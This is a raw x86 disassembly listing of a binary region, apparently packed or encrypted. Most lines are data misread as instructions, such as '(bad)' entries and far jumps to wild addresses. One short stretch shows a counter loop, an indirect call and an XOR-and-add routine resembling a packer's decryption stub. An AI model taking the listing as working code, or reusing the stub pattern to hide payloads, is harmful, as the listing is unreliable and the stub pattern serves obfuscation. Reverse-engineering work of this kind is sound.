  40f353:	mov    esp,0x28ee91df
  40f358:	fscale 
  40f35a:	aas    
  40f35b:	sub    dl,al
  40f35d:	mov    edi,0xd2dde644
  40f362:	mov    al,ds:0x413e168f
  40f367:	(bad)  
  40f369:	call   0x30de32b0
  40f36e:	mov    bl,0x5
  40f370:	test   BYTE PTR [eax+0x61b6c00c],dh
  40f376:	push   edx
  40f377:	push   0xfffffff0
  40f379:	jmp    0x40f3a0
  40f37b:	lock pusha 
  40f37d:	js     0x40f317
  40f37f:	and    al,0xa
  40f381:	loope  0x40f328
  40f383:	out    dx,al
  40f384:	jp     0x40f330
  40f386:	dec    edi
  40f387:	outs   dx,DWORD PTR ds:[esi]
  40f388:	rol    BYTE PTR ds:0xc2afc309,1
  40f38e:	jmp    0x60b6873d
  40f393:	in     al,dx
  40f394:	push   edx
  40f395:	xor    DWORD PTR [edx+ebp*2-0x62],ecx
  40f399:	xor    eax,0x336effd5
  40f39e:	idiv   ebp
  40f3a0:	ror    ecx,cl
  40f3a2:	jge    0x40f362
  40f3a4:	fidiv  DWORD PTR [ecx+ebx*4-0x57]
  40f3a8:	pop    eax
  40f3a9:	mov    dl,0xa9
  40f3ab:	jl     0x40f3c4
  40f3ad:	idiv   DWORD PTR [ecx+0x47bd4477]
  40f3b3:	(bad)  
  40f3b4:	sub    ebx,DWORD PTR [eax+0x4b]
  40f3b7:	jmp    0x7c80b087
  40f3bc:	out    0xba,al
  40f3be:	adc    ch,BYTE PTR [esi+edi*2-0x5a79249e]
  40f3c5:	hlt    
  40f3c6:	jmp    0x40f3e2
  40f3c8:	pop    esp
  40f3c9:	add    al,0x7e
  40f3cb:	xchg   DWORD PTR [edi+0x5f],esi
  40f3ce:	loope  0x40f367
  40f3d0:	out    0xd8,eax
  40f3d2:	retf   
  40f3d3:	nop
  40f3d4:	aaa    
  40f3d5:	pop    esi
  40f3d6:	xor    BYTE PTR [edi+0x67],dh
  40f3d9:	jp     0x40f43b
  40f3db:	inc    DWORD PTR [edi+0x43ad3a29]
  40f3e1:	xor    ah,BYTE PTR [ecx+0x69]
  40f3e4:	fdecstp 
  40f3e6:	jge    0x40f3e4
  40f3e8:	jecxz  0x40f429
  40f3ea:	jmp    0xaa5b7f95
  40f3ef:	or     eax,0xb6a77dec
  40f3f4:	jb     0x40f42e
  40f3f6:	mov    bl,0xc7
  40f3f8:	imul   ebp,DWORD PTR [ecx],0x9c5b1619
  40f3fe:	inc    esp
  40f3ff:	push   ebp
  40f400:	icebp  
  40f401:	mov    dl,0x77
  40f403:	les    esp,FWORD PTR [esi+0x11923b4]
  40f409:	push   edx
  40f40a:	adc    DWORD PTR [ecx-0x742e5196],eax
  40f410:	adc    al,0x90
  40f412:	mov    ebx,0x3c237df2
  40f417:	ret    0x81
  40f41a:	jbe    0x40f3d3
  40f41c:	mov    WORD PTR [eax],ss
  40f41e:	push   ss
  40f41f:	out    dx,al
  40f420:	xor    ebx,DWORD PTR [edi]
  40f422:	loopne 0x40f44d
  40f424:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f425:	mov    ebx,DWORD PTR [edi+0x2a]
  40f428:	stos   BYTE PTR es:[edi],al
  40f429:	mov    ecx,0x19013656
  40f42e:	push   ds
  40f42f:	jmp    0xdf98:0x4c002c17
  40f436:	add    al,0x31
  40f438:	(bad)  
  40f439:	adc    al,0x8b
  40f43b:	mov    edx,0x5759f222
  40f440:	xchg   ebp,eax
  40f441:	out    0x7b,al
  40f443:	cli    
  40f444:	shl    BYTE PTR [edx],cl
  40f446:	nop
  40f447:	mov    eax,0x6c92017a
  40f44c:	(bad)  
  40f44d:	cmp    eax,edi
  40f44f:	pop    ds
  40f450:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f451:	cli    
  40f452:	mov    ch,0xe0
  40f454:	mov    bl,0x75
  40f456:	jnp    0x40f440
  40f458:	cli    
  40f459:	fsub   DWORD PTR [ebp+eax*4-0x6b]
  40f45d:	and    ecx,DWORD PTR [ebx]
  40f45f:	add    ebx,DWORD PTR [edi+0x11]
  40f462:	das    
  40f463:	clc    
  40f464:	int    0x71
  40f466:	inc    ebx
  40f467:	or     al,0x58
  40f469:	lods   al,BYTE PTR ds:[esi]
  40f46a:	(bad)  
  40f46c:	aam    0x6
  40f46e:	add    DWORD PTR [eax-0x7f86505],eax
  40f474:	popf   
  40f475:	push   es
  40f476:	mov    dl,0x55
  40f478:	and    bl,ch
  40f47a:	lods   al,BYTE PTR ds:[esi]
  40f47b:	jae    0x40f47e
  40f47d:	sbb    DWORD PTR [ebx+0x1],esp
  40f480:	cmp    eax,0xce41849f
  40f485:	inc    esi
  40f486:	mov    edi,0x615caacb
  40f48b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f48c:	jns    0x40f4f6
  40f48e:	and    bl,bh
  40f490:	arpl   WORD PTR [edx-0x1915ef4c],si
  40f496:	push   ds
  40f497:	jb     0x40f4ff
  40f499:	add    bh,BYTE PTR [edx-0x1f]
  40f49c:	inc    ebx
  40f49d:	icebp  
  40f49e:	and    BYTE PTR [edx+edx*4],bl
  40f4a1:	dec    edx
  40f4a2:	js     0x40f46d
  40f4a4:	bound  eax,QWORD PTR [edi+0x1280d8b6]
  40f4aa:	loope  0x40f4a5
  40f4ac:	mov    dh,0xe7
  40f4ae:	fiadd  DWORD PTR [eax-0x30e8566a]
  40f4b4:	sub    al,0x29
  40f4b6:	dec    ecx
  40f4b7:	mov    edx,0x8cae42e5
  40f4bc:	dec    esi
  40f4bd:	and    esi,DWORD PTR [edx]
  40f4bf:	jae    0x40f4c7
  40f4c1:	call   0x2558:0x3cd64b68
  40f4c8:	test   al,0xea
  40f4ca:	icebp  
  40f4cb:	ret    
  40f4cc:	xchg   edi,eax
  40f4cd:	and    ebx,DWORD PTR [eax-0x10]
  40f4d0:	gs aaa 
  40f4d2:	fmul   QWORD PTR [edx+0x11]
  40f4d5:	inc    esp
  40f4d6:	inc    eax
  40f4d7:	fldcw  WORD PTR [eax]
  40f4d9:	xlat   BYTE PTR ds:[ebx]
  40f4da:	add    edi,ebx
  40f4dc:	push   ss
  40f4dd:	mov    ecx,DWORD PTR [esi+0x30]
  40f4e0:	xchg   ebx,eax
  40f4e1:	adc    al,0xf0
  40f4e3:	js     0x40f491
  40f4e5:	sub    esp,DWORD PTR [ebx-0x2d]
  40f4e8:	lds    ecx,FWORD PTR ds:0x4dbf1ba8
  40f4ee:	mov    al,0xd4
  40f4f0:	jae    0x40f49a
  40f4f2:	pop    es
  40f4f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4f4:	adc    al,BYTE PTR [ebx+0x685606d5]
  40f4fa:	in     eax,0xf9
  40f4fc:	pop    ebx
  40f4fd:	sbb    DWORD PTR [ebx+eiz*8+0x3a532cfe],esi
  40f504:	pop    ecx
  40f505:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f506:	pop    ebp
  40f507:	sbb    al,0x36
  40f509:	daa    
  40f50a:	adc    al,0x32
  40f50c:	inc    esi
  40f50d:	shr    BYTE PTR [edi],cl
  40f50f:	cmp    ebp,esp
  40f511:	ret    
  40f512:	loope  0x40f4d5
  40f514:	arpl   WORD PTR [ebx],bp
  40f516:	ficom  DWORD PTR [ebp+0x161136c0]
  40f51c:	mov    ds,WORD PTR [eax-0x66d1d94c]
  40f522:	adc    ebx,DWORD PTR [ebp+0x2ccdc781]
  40f528:	stos   BYTE PTR es:[edi],al
  40f529:	les    ebp,FWORD PTR [ebx+0x73]
  40f52c:	loop   0x40f5a6
  40f52e:	imul   BYTE PTR [esi-0x61]
  40f531:	shl    BYTE PTR [ecx+ebx*8-0x2a],1
  40f535:	inc    ebx
  40f536:	push   esp
  40f537:	fbld   TBYTE PTR [eax+0x6f886a65]
  40f53d:	fstp   TBYTE PTR ds:0xff2a045a
  40f543:	add    bh,BYTE PTR [eax-0x28]
  40f546:	adc    DWORD PTR [edx-0x38],ebx
  40f549:	pop    ecx
  40f54a:	fdivrp st(5),st
  40f54c:	ins    DWORD PTR es:[edi],dx
  40f54d:	stc    
  40f54e:	jae    0x40f54a
  40f550:	add    DWORD PTR [ebp-0x58359c29],edi
  40f556:	xchg   ebx,eax
  40f557:	pop    edi
  40f558:	(bad)  
  40f559:	mov    ebx,0xb8e6fa7d
  40f55e:	adc    al,0x64
  40f560:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f561:	outs   dx,DWORD PTR ds:[esi]
  40f562:	cwde   
  40f563:	stc    
  40f564:	lea    edi,[edx+0x49a3fde3]
  40f56a:	mov    al,ds:0x3bfda069
  40f56f:	js     0x40f53f
  40f571:	fidiv  WORD PTR [esi+0x7f7b5bf8]
  40f577:	les    esp,FWORD PTR [edi+0x748c20fe]
  40f57d:	rcl    BYTE PTR ds:0x79c9c020,cl
  40f583:	or     al,BYTE PTR [ebx-0x3d]
  40f586:	jmp    0x583f:0xa0826bae
  40f58d:	mov    dl,ch
  40f58f:	ins    BYTE PTR es:[edi],dx
  40f590:	sub    cl,al
  40f592:	jbe    0x40f5a6
  40f594:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f595:	sar    BYTE PTR [esi-0x6f4e5f82],0xde
  40f59c:	sub    esp,ebp
  40f59e:	pop    eax
  40f59f:	xchg   edx,eax
  40f5a0:	cwde   
  40f5a1:	xor    al,0x32
  40f5a3:	or     al,0x6a
  40f5a5:	pusha  
  40f5a6:	sub    eax,0xb705588c
  40f5ab:	mov    cl,0xf6
  40f5ad:	mov    ch,0xc
  40f5af:	xchg   esi,eax
  40f5b0:	mov    BYTE PTR [eax-0x1d8e4e55],0x5d
  40f5b7:	pop    esi
  40f5b8:	xor    ah,al
  40f5ba:	sbb    bh,ah
  40f5bc:	loope  0x40f553
  40f5be:	sub    ebx,ecx
  40f5c0:	push   edi
  40f5c1:	xor    edi,DWORD PTR ss:[edx]
  40f5c4:	jmp    0x40f5d6
  40f5c6:	stc    
  40f5c7:	ror    BYTE PTR [edi+0x16],cl
  40f5ca:	pop    ds
  40f5cb:	sub    dl,BYTE PTR [edi]
  40f5cd:	xchg   ecx,eax
  40f5ce:	mov    al,ds:0x86e9e437
  40f5d3:	mov    cl,0x20
  40f5d5:	(bad)  
  40f5d7:	or     al,0x44
  40f5d9:	popa   
  40f5da:	jge    0x40f5d8
  40f5dc:	push   edi
  40f5dd:	out    0x32,eax
  40f5df:	(bad)  
  40f5e0:	int    0xd1
  40f5e2:	sbb    BYTE PTR [ebx+0x4d5e8ef2],0xe2
  40f5e9:	push   es
  40f5ea:	inc    eax
  40f5eb:	inc    ecx
  40f5ec:	sbb    al,0x54
  40f5ee:	dec    ebx
  40f5ef:	push   cs
  40f5f0:	push   es
  40f5f1:	pop    esp
  40f5f2:	mov    dh,0xa4
  40f5f4:	xchg   esi,eax
  40f5f5:	aam    0xf5
  40f5f7:	ss xor al,0xfa
  40f5fa:	cwde   
  40f5fb:	jo     0x40f5f3
  40f5fd:	(bad)  
  40f5fe:	(bad)  
  40f5ff:	iret   
  40f600:	xchg   ebp,eax
  40f601:	lea    ecx,[edx+0x587361d5]
  40f607:	mov    al,ds:0x23fd2ec9
  40f60c:	mov    edx,DWORD PTR ds:0x6aa97289
  40f612:	imul   ecx,esi,0x192576a8
  40f618:	push   esp
  40f619:	int    0x60
  40f61b:	ins    DWORD PTR es:[edi],dx
  40f61c:	push   ecx
  40f61d:	mov    WORD PTR [ebx],es
  40f61f:	and    al,0x41
  40f621:	cmc    
  40f622:	push   es
  40f623:	pop    ds
  40f624:	jnp    0x40f62e
  40f626:	jecxz  0x40f5e6
  40f628:	mov    ds:0x7c955deb,eax
  40f62d:	push   esi
  40f62e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f62f:	cs jnp 0x40f667
  40f632:	les    edi,FWORD PTR [esi]
  40f634:	pop    ecx
  40f635:	mov    BYTE PTR [edi],dl
  40f637:	sti    
  40f638:	or     DWORD PTR [edx+0xb6051ae],edi
  40f63e:	sbb    DWORD PTR [ebp+0x748bd59],ebx
  40f644:	add    ebx,ecx
  40f646:	xchg   edi,eax
  40f647:	adc    al,0x5c
  40f649:	or     bl,BYTE PTR [ebx+0x5bf5f831]
  40f64f:	push   0x13aa3db3
  40f654:	test   BYTE PTR [edi-0x61],bl
  40f657:	pop    esi
  40f658:	mov    ch,0x3a
  40f65a:	ficomp DWORD PTR [ecx]
  40f65c:	pop    ebx
  40f65d:	in     eax,dx
  40f65e:	ret    0xb863
  40f661:	loope  0x40f6d0
  40f663:	push   ecx
  40f664:	mov    ds:0xc77ec898,eax
  40f669:	imul   edx,edi,0x43b759d3
  40f66f:	test   BYTE PTR [esi],bh
  40f671:	cli    
  40f672:	xchg   edi,eax
  40f673:	jge    0x40f601
  40f675:	xor    ah,bh
  40f677:	aaa    
  40f678:	inc    DWORD PTR [edi+0x5b040b8c]
  40f67e:	mov    dl,0x67
  40f680:	je     0x40f6cd
  40f682:	or     al,0xc9
  40f684:	(bad)  
  40f685:	xor    al,BYTE PTR [esi-0x695b3352]
  40f68b:	mov    eax,ds:0x9c44f37b
  40f690:	mov    bl,0xa2
  40f692:	je     0x40f6b4
  40f694:	push   ds
  40f695:	(bad)  
  40f696:	mov    edi,0x6eeb70bd
  40f69b:	push   cs
  40f69c:	sbb    DWORD PTR [ebx+0x7209933b],ebp
  40f6a2:	xchg   ebx,eax
  40f6a3:	push   ss
  40f6a4:	mov    cs:0x8e2b13f6,al
  40f6aa:	jae    0x40f6ae
  40f6ac:	add    eax,0x6e7912e9
  40f6b1:	sub    esi,DWORD PTR [eax-0x40062320]
  40f6b7:	imul   esi,DWORD PTR [eax],0x36a74edf
  40f6bd:	jbe    0x40f73e
  40f6bf:	push   0xffffffbf
  40f6c1:	mov    edi,0xce75172b
  40f6c6:	mov    edx,0x33e41d82
  40f6cb:	xlat   BYTE PTR ds:[ebx]
  40f6cc:	push   esi
  40f6cd:	stos   BYTE PTR es:[edi],al
  40f6ce:	imul   eax,DWORD PTR [esi-0x3b],0x465b4cd9
  40f6d5:	into   
  40f6d6:	mov    esi,0x2ef691b4
  40f6db:	xor    al,0xd4
  40f6dd:	mov    esi,eax
  40f6df:	xor    al,BYTE PTR [ebp+esi*8+0x7aef26b0]
  40f6e6:	mov    dh,0x6a
  40f6e8:	push   DWORD PTR [ebx+0x75bb3cea]
  40f6ee:	pop    ecx
  40f6ef:	repnz stos BYTE PTR es:[edi],al
  40f6f1:	mov    ds:0x6817293f,eax
  40f6f6:	call   0x2ba4:0x480cba5f
  40f6fd:	sar    BYTE PTR [ecx-0x38d2d193],0xb4
  40f704:	xchg   esp,eax
  40f705:	(bad)  
  40f706:	mov    dh,0xca
  40f708:	cwde   
  40f709:	outs   dx,BYTE PTR ds:[esi]
  40f70a:	push   edi
  40f70b:	adc    ebp,esi
  40f70d:	adc    ecx,DWORD PTR [eax]
  40f70f:	rol    BYTE PTR [ebp+ebx*8-0x4e7d0f69],0xd1
  40f717:	push   ecx
  40f718:	addr16 jmp 0x4d40:0xed7a3ec8
  40f720:	icebp  
  40f721:	pop    es
  40f722:	dec    eax
  40f723:	inc    ebp
  40f724:	jl     0x40f70d
  40f726:	inc    edx
  40f727:	test   eax,0x4402b90e
  40f72c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f72d:	mov    al,ds:0x454bd197
  40f732:	adc    eax,0xe3fa008
  40f737:	int    0x3a
  40f739:	pop    ebx
  40f73a:	mov    al,ds:0x9ec6824e
  40f73f:	js     0x40f757
  40f741:	sbb    BYTE PTR [eax],bh
  40f743:	fdiv   DWORD PTR [esi]
  40f745:	mov    bl,BYTE PTR [ecx]
  40f747:	cmp    al,0x98
  40f749:	int    0x62
  40f74b:	sbb    eax,0x99c95344
  40f750:	js     0x40f7ab
  40f752:	rcr    ebx,cl
  40f754:	rcr    DWORD PTR [eax-0x30],0xff
  40f758:	push   ebx
  40f759:	xchg   ecx,eax
  40f75a:	jo     0x40f7cb
  40f75c:	mov    DWORD PTR [ebx+ebp*8],edx
  40f75f:	jmp    0xccf2bbc5
  40f764:	adc    eax,esi
  40f766:	lahf   
  40f767:	pushf  
  40f768:	mul    BYTE PTR [ecx+0x50]
  40f76b:	icebp  
  40f76c:	inc    ebx
  40f76d:	cmc    
  40f76e:	loop   0x40f7ac
  40f770:	test   ebx,0x20b52f67
  40f776:	popa   
  40f777:	shl    DWORD PTR [eax-0x4c830285],0xd4
  40f77e:	pushf  
  40f77f:	mov    ds:0xdf71772f,eax
  40f784:	mov    eax,ds:0xeba32bbb
  40f789:	push   eax
  40f78a:	out    dx,eax
  40f78b:	jo     0x40f76f
  40f78d:	stc    
  40f78e:	in     eax,0x38
  40f790:	sti    
  40f791:	aam    0xf0
  40f793:	les    edi,FWORD PTR [ebx-0x11d1448b]
  40f799:	sub    esi,DWORD PTR [edi]
  40f79b:	cmp    bh,bh
  40f79d:	mov    ds:0xd49172e9,eax
  40f7a2:	sbb    al,0x20
  40f7a4:	ins    BYTE PTR es:[edi],dx
  40f7a5:	or     BYTE PTR [esi],ah
  40f7a7:	(bad)  
  40f7a8:	add    bl,BYTE PTR [edx+0x6d784916]
  40f7ae:	outs   dx,BYTE PTR ds:[esi]
  40f7af:	loopne 0x40f7ac
  40f7b1:	popf   
  40f7b2:	cmp    cl,dl
  40f7b4:	fcmovu st,st(6)
  40f7b6:	mov    esi,0xcdab5196
  40f7bb:	les    eax,FWORD PTR [ecx+0x3c82b476]
  40f7c1:	gs cwde 
  40f7c3:	and    dl,BYTE PTR [ebx+0x5f]
  40f7c6:	mov    ecx,0x75108b3
  40f7cb:	xor    eax,ecx
  40f7cd:	or     DWORD PTR ds:0x426ed1,0x426eb9
  40f7d7:	add    eax,0x3272fa
  40f7dc:	mov    DWORD PTR [edx],eax
  40f7de:	and    DWORD PTR ds:0x426ed5,0x0
  40f7e8:	jmp    0x40f7fb
  40f7ed:	xor    eax,eax
  40f7ef:	or     eax,DWORD PTR ds:0x426ed5
  40f7f5:	inc    eax
  40f7f6:	mov    ds:0x426ed5,eax
  40f7fb:	cmp    DWORD PTR ds:0x426ed5,0x14
  40f802:	jae    0x40f83d
  40f808:	cmp    DWORD PTR ds:0x426ed5,0x5
  40f80f:	jb     0x40f83d
  40f815:	jmp    0x40f820
  40f81a:	call   DWORD PTR ds:0x430a38
  40f820:	cmp    DWORD PTR ds:0x426ed5,0x4
  40f827:	jne    0x40f838
  40f82d:	mov    eax,ds:0x426ed5
  40f832:	inc    eax
  40f833:	mov    ds:0x426ed5,eax
  40f838:	jmp    0x40f7ed
  40f83d:	mov    eax,DWORD PTR [ebp+0xc]
  40f840:	xor    eax,ecx
  40f842:	push   esi
  40f843:	mov    esi,DWORD PTR [ebp+0x10]
  40f846:	mov    edx,0x3272fa
  40f84b:	add    eax,edx
  40f84d:	mov    DWORD PTR [esi+0x4],eax
  40f850:	mov    eax,DWORD PTR [ebp+0x14]
  40f853:	jmp    0x411bef
  40f858:	or     ecx,DWORD PTR [ecx+0x2a]
  40f85b:	mov    ds:0x7813f878,al
  40f860:	xor    al,0xd8
  40f862:	mov    edi,DWORD PTR ds:0x33c02d5e
  40f868:	fwait
  40f869:	dec    esi
  40f86a:	jnp    0x40f8e7
  40f86c:	clc    
  40f86d:	pushf  
  40f86e:	jnp    0x40f8eb
  40f870:	outs   dx,DWORD PTR ds:[esi]
  40f871:	sub    eax,0x34588119
  40f876:	xchg   ecx,eax
  40f877:	mov    ebp,0x4b0a8d4a
  40f87c:	mov    cl,0x91
  40f87e:	or     al,0xc1
  40f880:	xchg   esi,eax
  40f881:	cdq    
  40f882:	test   eax,0x77612520
  40f887:	fucomi st,st(2)
  40f889:	imul   eax,DWORD PTR [esi-0x38b329f6],0x1c1b2422
  40f893:	xchg   esp,eax
  40f894:	out    0x69,eax
  40f896:	mov    ss,WORD PTR [ebx+0x6514e2c8]
  40f89c:	(bad)  
  40f89e:	pop    es
  40f89f:	enter  0xc010,0x5
  40f8a3:	test   BYTE PTR [esi+eax*2],ah
  40f8a6:	adc    eax,0xc0682cd3
  40f8ab:	retf   0x2d9d
  40f8ae:	sbb    ecx,DWORD PTR [edi-0x6b]
  40f8b1:	aas    
  40f8b2:	lods   al,BYTE PTR ds:[esi]
  40f8b3:	push   eax
  40f8b4:	js     0x40f88b
  40f8b6:	cmp    DWORD PTR [ebp+0x6d8f8061],ebp
  40f8bc:	popf   
  40f8bd:	int    0x1d
  40f8bf:	mov    esp,0x13a1f676
  40f8c4:	jb     0x40f8b8
  40f8c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8c7:	inc    esi
  40f8c8:	das    
  40f8c9:	(bad)  
  40f8ca:	xor    dl,bl
  40f8cc:	aas    
  40f8cd:	xchg   edx,eax
  40f8ce:	mov    ah,0x2c
  40f8d0:	cmp    esp,DWORD PTR [ebx]
  40f8d2:	push   0x55
  40f8d4:	imul   ebx,edx,0x3f
  40f8d7:	jae    0x40f85a
  40f8d9:	jns    0x40f8ff
  40f8db:	dec    esp
  40f8dc:	dec    edx
  40f8dd:	jg     0x40f894
  40f8df:	cmp    al,0x44
  40f8e1:	nop
  40f8e2:	push   ebx
  40f8e3:	aam    0xa8
  40f8e5:	mov    esp,0x23d3fd97
  40f8ea:	pop    esp
  40f8eb:	inc    ebp
  40f8ec:	aaa    
  40f8ed:	pop    ds
  40f8ee:	retf   
  40f8ef:	cmc    
  40f8f0:	xor    BYTE PTR [ecx-0x26],bh
  40f8f3:	sbb    BYTE PTR [edi-0x7f7ee985],0x1f
  40f8fa:	add    dh,0x94
  40f8fd:	dec    ebx
  40f8fe:	adc    eax,0xcb7c4b22
  40f903:	sbb    al,0x2b
  40f905:	and    edx,ecx
  40f907:	sbb    BYTE PTR [ebp+ebx*1-0x1e84fdad],ch
  40f90e:	clc    
  40f90f:	pop    ecx
  40f910:	(bad)  
  40f911:	xchg   ebx,eax
  40f912:	call   0x5b64:0x52426f52
  40f919:	add    bh,cl
  40f91b:	adc    dh,dl
  40f91d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f91e:	jmp    0xbc15aeb8
  40f923:	fidivr DWORD PTR [esp+ebp*8-0x6d3380b6]
  40f92a:	push   esp
  40f92b:	in     eax,0xd5
  40f92d:	push   ecx
  40f92e:	fwait
  40f92f:	add    al,0x3c
  40f931:	mov    ebx,0x39ca98f6
  40f936:	das    
  40f937:	mov    dl,0x99
  40f939:	push   esi
  40f93a:	int3   
  40f93b:	cmp    DWORD PTR [eax-0x4cbe1c8a],esi
  40f941:	fdiv   st(7),st
  40f943:	xchg   ebx,eax
  40f944:	inc    ebx
  40f945:	ds mov edi,0xc5741833
  40f94b:	adc    DWORD PTR [ebp-0x5f57b1fa],esp
  40f951:	add    DWORD PTR [ebx],esp
  40f953:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f954:	(bad)  
  40f955:	iret   
  40f956:	mov    al,0x2b
  40f958:	dec    edx
  40f959:	push   edi
  40f95a:	mov    DWORD PTR [ebp-0xb],ebx
  40f95d:	mov    ds:0x38071382,eax
  40f962:	mov    DWORD PTR [esi],edx
  40f964:	leave  
  40f965:	out    0xa,eax
  40f967:	dec    esp
  40f968:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f969:	(bad)  
  40f96a:	sub    DWORD PTR [eax-0x71e00004],edx
  40f970:	popa   
  40f971:	jl     0x40f996
  40f973:	pop    ebp
  40f974:	and    al,0xeb
  40f976:	ds test eax,0xd788e65
  40f97c:	(bad)  [ecx]
  40f97e:	pushf  
  40f97f:	dec    DWORD PTR [edi-0x3f]
  40f982:	add    BYTE PTR [edi-0x1fcdc51b],0x55
  40f989:	aam    0x4c
  40f98b:	imul   esi,ebx,0xa9a53d74
  40f991:	mov    al,ds:0x5c95cb2b
  40f996:	pop    ebx
  40f997:	retf   
  40f998:	or     bh,BYTE PTR [edx+0x287dc11c]
  40f99e:	cmp    dl,BYTE PTR [ecx+0x3399689e]
  40f9a4:	test   DWORD PTR [edx-0x5f],esi
  40f9a7:	aaa    
  40f9a8:	lock or al,0xa3
  40f9ab:	adc    DWORD PTR [edx-0x7f375074],eax
  40f9b1:	xor    eax,0xcef1618b
  40f9b6:	je     0x40f94f
  40f9b8:	push   es
  40f9b9:	and    eax,0x85e222af
  40f9be:	cdq    
  40f9bf:	leave  
  40f9c0:	xlat   BYTE PTR ds:[ebx]
  40f9c1:	and    edi,DWORD PTR [edi]
  40f9c3:	sub    edx,esp
  40f9c5:	and    eax,edx
  40f9c7:	das    
  40f9c8:	sub    DWORD PTR [esi-0x7a],ebx
  40f9cb:	jmp    0xbe79bfc8
  40f9d0:	mov    ds:0x14123dc,al
  40f9d5:	sub    BYTE PTR fs:[ebx+esi*2+0x68de3a14],cl
  40f9dd:	mov    esp,0xa1144457
  40f9e2:	test   eax,0xcbf107aa
  40f9e7:	jg     0x40f9da
  40f9e9:	test   BYTE PTR [ecx+0x73],0xe2
  40f9ed:	jmp    FWORD PTR [eax+0x4f779537]
  40f9f3:	cmp    al,0xa3
  40f9f5:	push   esp
  40f9f6:	adc    al,bl
  40f9f8:	jg     0x40f9d3
  40f9fa:	push   ebp
  40f9fb:	jbe    0x40f9b5
  40f9fd:	mov    dl,0x4a
  40f9ff:	jp     0x40fa2d
  40fa01:	aaa    
  40fa02:	loopne 0x40f9ae
  40fa04:	mov    bh,0xa8
  40fa06:	jno    0x40fa30
  40fa08:	jae    0x40f9cf
  40fa0a:	shr    DWORD PTR [eax],1
  40fa0c:	sub    bh,BYTE PTR [ebx]
  40fa0e:	stc    
  40fa0f:	arpl   WORD PTR [edi+ebp*8-0x6ee1e408],di
  40fa16:	mov    al,0x77
  40fa18:	and    BYTE PTR [esi-0x44],cl
  40fa1b:	and    bh,BYTE PTR [ebx]
  40fa1d:	mov    al,0x3e
  40fa1f:	dec    ecx
  40fa20:	or     BYTE PTR [ebx+0x6accd15c],dh
  40fa26:	xor    ah,al
  40fa28:	pusha  
  40fa29:	adc    dh,dl
  40fa2b:	mov    dh,0xb
  40fa2d:	repnz mov eax,ds:0x37a2a712
  40fa33:	dec    esp
  40fa34:	push   0xec367a25
  40fa39:	ret    
  40fa3a:	mov    edx,0xa6319805
  40fa3f:	jbe    0x40fa1d
  40fa41:	cmp    BYTE PTR [ecx],cl
  40fa43:	sub    eax,DWORD PTR es:[ebp+0x57ee0bb7]
  40fa4a:	stos   BYTE PTR es:[edi],al
  40fa4b:	cld    
  40fa4c:	inc    edi
  40fa4d:	nop
  40fa4e:	sbb    eax,0xc7121cea
  40fa53:	adc    ebp,0xffffffb0
  40fa56:	xor    DWORD PTR [ebp+0x13],edi
  40fa59:	add    ebx,DWORD PTR [esi]
  40fa5b:	or     BYTE PTR [ebx],bl
  40fa5d:	sar    BYTE PTR [ecx+0x5c0f3dfc],1
  40fa63:	and    ch,BYTE PTR [edi]
  40fa65:	push   es
  40fa66:	(bad)  
  40fa67:	jp     0x40fa7c
  40fa69:	push   edx
  40fa6a:	loope  0x40fa65
  40fa6c:	fadd   DWORD PTR [edi]
  40fa6e:	jmp    DWORD PTR es:[ebp+ebp*1+0x62]
  40fa73:	stos   BYTE PTR es:[edi],al
  40fa74:	xchg   ecx,eax
  40fa75:	jo     0x40fab0
  40fa77:	and    bh,dh
  40fa79:	push   esi
  40fa7a:	inc    ecx
  40fa7b:	lods   al,BYTE PTR ds:[esi]
  40fa7c:	and    dl,0x7c
  40fa7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa80:	pop    ds
  40fa81:	loope  0x40fafb
  40fa83:	jo     0x40fac7
  40fa85:	pop    ss
  40fa86:	xchg   ebx,eax
  40fa87:	cmp    DWORD PTR [ebp+0xccdcc86],0x54541190
  40fa91:	test   eax,0xbad21784
  40fa96:	xor    al,0x9f
  40fa98:	ds popf 
  40fa9a:	std    
  40fa9b:	and    eax,esi
  40fa9d:	mov    al,0x50
  40fa9f:	aad    0xae
  40faa1:	or     DWORD PTR [ecx-0x2b],eax
  40faa4:	jo     0x40fb0c
  40faa6:	das    
  40faa7:	into   
  40faa8:	adc    eax,0x11bedb58
  40faad:	test   BYTE PTR [esi+0xf3464a3],bl
  40fab3:	push   es
  40fab4:	out    0xed,eax
  40fab6:	jmp    0x77a0:0x7084ddc8
  40fabd:	out    dx,eax
  40fabe:	jne    0x40fabb
  40fac0:	cwde   
  40fac1:	xor    eax,0x54c8ff3
  40fac6:	xor    cl,cl
  40fac8:	dec    ebp
  40fac9:	nop
  40faca:	pop    es
  40facb:	push   ds
  40facc:	jecxz  0x40fb44
  40face:	sub    ch,BYTE PTR [eax-0xe]
  40fad1:	sbb    ebx,DWORD PTR [esi+0x23de1a68]
  40fad7:	jmp    0x40fade
  40fad9:	test   ebx,ecx
  40fadb:	push   ds
  40fadc:	mov    bl,0x17
  40fade:	jl     0x40fb47
  40fae0:	sbb    al,0xd9
  40fae3:	push   eax
  40fae4:	sub    eax,0x98cec084
  40fae9:	cmp    esi,eax
  40faeb:	jae    0x40faa5
  40faed:	sub    al,BYTE PTR [ecx+0x619a47f5]
  40faf3:	mov    edx,0x22393dd7
  40faf8:	test   DWORD PTR [ebp+0x2c6fe73],0xc672550f
  40fb02:	pop    edi
  40fb03:	leave  
  40fb04:	sub    BYTE PTR [edx-0x470ec0fb],dh
  40fb0a:	jmp    0x96d3be12
  40fb0f:	aaa    
  40fb10:	sbb    DWORD PTR [edx-0x418523d],0xffffffa8
  40fb17:	jb     0x40fb55
  40fb19:	gs xchg edi,eax
  40fb1b:	in     eax,dx
  40fb1c:	jno    0x40fb65
  40fb1e:	jg     0x40facc
  40fb20:	inc    edi
